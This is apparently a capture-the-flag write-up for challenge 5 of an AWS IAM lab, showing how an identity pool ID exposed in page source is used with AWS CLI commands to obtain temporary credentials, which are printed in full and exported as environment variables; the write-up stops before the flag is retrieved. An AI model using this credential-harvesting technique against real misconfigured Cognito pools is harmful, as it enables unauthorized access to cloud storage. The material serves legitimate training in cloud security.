# Challenge 5

**Challenge 5:** https://bigiamchallenge.com/challenge/5

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/d845a952-6fee-43c8-a298-b192a1edee4b)

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/ab739629-f041-446f-aa59-16d35b18c4ac)

View page source:

  AWS.config.region = 'us-east-1';
  
  AWS.config.credentials = new AWS.CognitoIdentityCredentials({IdentityPoolId: "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"});

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/42f2bb75-520d-49ec-b46b-8f13cfd261f4)




```
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "VisualEditor0",
            "Effect": "Allow",
            "Action": [
                "mobileanalytics:PutEvents",
                "cognito-sync:*"
            ],
            "Resource": "*"
        },
        {
            "Sid": "VisualEditor1",
            "Effect": "Allow",
            "Action": [
                "s3:GetObject",
                "s3:ListBucket"
            ],
            "Resource": [
                "arn:aws:s3:::wiz-privatefiles",
                "arn:aws:s3:::wiz-privatefiles/*"
            ]
        }
    ]
}
```


```
  AWS.config.region = 'us-east-1';
  AWS.config.credentials = new AWS.CognitoIdentityCredentials({IdentityPoolId: "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"});
  // Set the region
  AWS.config.update({region: 'us-east-1'});

  $(document).ready(function() {
    var s3 = new AWS.S3();
    params = {
      Bucket: 'wiz-privatefiles',
      Key: 'cognito1.png',
      Expires: 60 * 60
    }

    signedUrl = s3.getSignedUrl('getObject', params, function (err, url) {
      $('#signedImg').attr('src', url);
    });
});
```


```
> aws cognito-identity get-id --identity-pool-id "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
{
    "IdentityId": "us-east-1:157d6171-eec5-c68e-6d76-37b115b08a34"
}
> aws cognito-identity get-credentials-for-identity --identity-id us-east-1:157d6171-eec5-c68e-6d76-37b115b08a34
{
    "IdentityId": "us-east-1:157d6171-eec5-c68e-6d76-37b115b08a34",
    "Credentials": {
        "AccessKeyId": "ASIARK7LBOHXAT23B5UY",
        "SecretKey": "UPmWkussfR3nPJP2w3za1HkLyc2LRCp/TBvo6iGL",
        "SessionToken": "IQoJb3JpZ2luX2VjEP///////////wEaCXVzLWVhc3QtMSJIMEYCIQCM0cu9D4CqyIeKkY7nR2Rg7CF5D0t3tP0Qxnw7HjA0UgIhANHRvbmSg2qmX/GsQM6xKAf1m4Xq1CmKGofG/CN9IkxDKtAFCIj//////////wE
QABoMMDkyMjk3ODUxMzc0Igz1tRFAhkfJJUVCQJsqpAU+ijCpSHc/INQfUR7PkSH9ArvNX35qN7DRY6dl4KnEINAEQ6uWfMp8ba2WxU79qesv41Nm4rx5Eod7iE4RnzxCWLyJ6bWF1HEO894M3HHA9j4A8V7GDq9bH72Elv8OJLYNkaKDig15dAOHfn8
zBCGpG1t8bT8CQ/c5ZnfQsKdmXUAGC41UMrysgkswCsl/eIRPgvkPd+f7uHjGxX/m99Zo7HCR4a/aMkXF4akxUvT8m/hpY5i3q5Z9+oBERy3KSR1x4TzpG6cuE9DjVOYSOaoVbqSmylPFcUCR45GVwP+RTEOdppofIT7JOEBZ2t7EwO2EVupovZFlFIE
an3n1a/EswFXvBopHGnCEKJ+VpaaWTH9Q9mdBgfwDjhGvNKkoMzLcDwRvAdMGTf47F+QoUSP01R6rQiF8KGFOCavKxqYxNLHBhhYjM7QiJd/hahrNYDUVUceR8R2iU4yqmlEcEwuYNlHTOBsINuYBAPB3jKae++70P15LVKqMFMaoFSbYbGz4WHPfVRY
hqKvJhgNMz5Wu0WhlhBjpnYHmyqOvWmn5JX3yy09HkXKQ2wwTq/CXN5Q6EvjbbgzpkwyNvpVLFcD4in79L38RMuK6u4ru41NaQfQFzu9JK1+iqI1wGqE7UlI5Zn0cm96scvG/TE/x0mPIsUrUukMs9rKNOk7FnfB9vmgPO3PZwLhnnuR/PnFeFqfWqv2
WsKZfaGJA8lm/BLVqlz9aHyf8+qaDCOWmJmpgWWLwRr+okexC4t1ANGP5LZWeFo2vdDfDz/rCdOTCv8+bgR7n984RbvSSmVMNoYVg5sBlCxJBRWMKi2C4uF0V7OefHreAHuPThagunLl2Ecv/D/+zAcQ64lHSfhlmQ5juTdCxYiITwpZuaz8CxhB9UTg
1Fnq4MNLJ9bIGOt4C9X680GbSgIw33p1WXvmoOnx6QuCrNCKdodafFmtAM6HncfaF50feQkHrg5I9erZrbxJDToOjWxKdfBknbXZqZ4hLm1tNNtpNIobupAJU9FywKrRCbNFCja5SLxeVBvWoHxvRl247+FzBkdhl4f0AwcfTmOlh/9s5GE7+bvv2bMQ
39b7pFieJ0FubvDRJuI2HquVx5uTbQfP58cU1yUAINfYUu05yxGGckTNrEwclGOjCSsgsltQc604VvKXGB339/eVwQl7P/t49u8D9ivvtwhlZ3SaU++37huPnX6jKhq72k/uiVYPLJcSYhcaM/22N8WC7G9Bj0HK+iSjc8EhzqGqPPtTSOAAwWtLADjA
XqCywJRGGDg33o0ch/DQC98BxQkM1cwMO5e6pN1of87vj7mns8tru/6pAfB9CGqEnuRu/m14lSHjfcl8yhwTEpdlS1QRlDCg6GHnZeLXYoGE=",
        "Expiration": 1717400290.0
    }
}
```

**export** or **set** credentials:

```
> set AWS_ACCESS_KEY_ID=ASIARK7LBOHXAT23B5UY
> set AWS_SECRET_ACCESS_KEY=UPmWkussfR3nPJP2w3za1HkLyc2LRCp/TBvo6iGL
> set AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEP///////////wEaCXVzLWVhc3QtMSJIMEYCIQCM0cu9D4CqyIeKkY7nR2Rg7CF5D0t3tP0Qxnw7HjA0UgIhANHRvbmSg2qmX/GsQM6xKAf1m4Xq1CmKGofG/CN9IkxDKtAFCIj//////////wEQABoMMDkyMjk3ODUxMzc0Igz1tRFAhkfJJUVCQJsqpAU+ijCpSHc/INQfUR7PkSH9ArvNX35qN7DRY6dl4KnEINAEQ6uWfMp8ba2WxU79qesv41Nm4rx5Eod7iE4RnzxCWLyJ6bWF1HEO894M3HHA9j4A8V7GDq9bH72Elv8OJLYNkaKDig15dAOHfn8zBCGpG1t8bT8CQ/c5ZnfQsKdmXUAGC41UMrysgkswCsl/eIRPgvkPd+f7uHjGxX/m99Zo7HCR4a/aMkXF4akxUvT8m/hpY5i3q5Z9+oBERy3KSR1x4TzpG6cuE9DjVOYSOaoVbqSmylPFcUCR45GVwP+RTEOdppofIT7JOEBZ2t7EwO2EVupovZFlFIEan3n1a/EswFXvBopHGnCEKJ+VpaaWTH9Q9mdBgfwDjhGvNKkoMzLcDwRvAdMGTf47F+QoUSP01R6rQiF8KGFOCavKxqYxNLHBhhYjM7QiJd/hahrNYDUVUceR8R2iU4yqmlEcEwuYNlHTOBsINuYBAPB3jKae++70P15LVKqMFMaoFSbYbGz4WHPfVRYhqKvJhgNMz5Wu0WhlhBjpnYHmyqOvWmn5JX3yy09HkXKQ2wwTq/CXN5Q6EvjbbgzpkwyNvpVLFcD4in79L38RMuK6u4ru41NaQfQFzu9JK1+iqI1wGqE7UlI5Zn0cm96scvG/TE/x0mPIsUrUukMs9rKNOk7FnfB9vmgPO3PZwLhnnuR/PnFeFqfWqv2WsKZfaGJA8lm/BLVqlz9aHyf8+qaDCOWmJmpgWWLwRr+okexC4t1ANGP5LZWeFo2vdDfDz/rCdOTCv8+bgR7n984RbvSSmVMNoYVg5sBlCxJBRWMKi2C4uF0V7OefHreAHuPThagunLl2Ecv/D/+zAcQ64lHSfhlmQ5juTdCxYiITwpZuaz8CxhB9UTg1Fnq4MNLJ9bIGOt4C9X680GbSgIw33p1WXvmoOnx6QuCrNCKdodafFmtAM6HncfaF50feQkHrg5I9erZrbxJDToOjWxKdfBknbXZqZ4hLm1tNNtpNIobupAJU9FywKrRCbNFCja5SLxeVBvWoHxvRl247+FzBkdhl4f0AwcfTmOlh/9s5GE7+bvv2bMQ39b7pFieJ0FubvDRJuI2HquVx5uTbQfP58cU1yUAINfYUu05yxGGckTNrEwclGOjCSsgsltQc604VvKXGB339/eVwQl7P/t49u8D9ivvtwhlZ3SaU++37huPnX6jKhq72k/uiVYPLJcSYhcaM/22N8WC7G9Bj0HK+iSjc8EhzqGqPPtTSOAAwWtLADjAXqCywJRGGDg33o0ch/DQC98BxQkM1cwMO5e6pN1of87vj7mns8tru/6pAfB9CGqEnuRu/m14lSHjfcl8yhwTEpdlS1QRlDCg6GHnZeLXYoGE=
> set AWS_DEFAULT_REGION=us-east-1
> aws sts get-caller-identity --profile challenge5

```





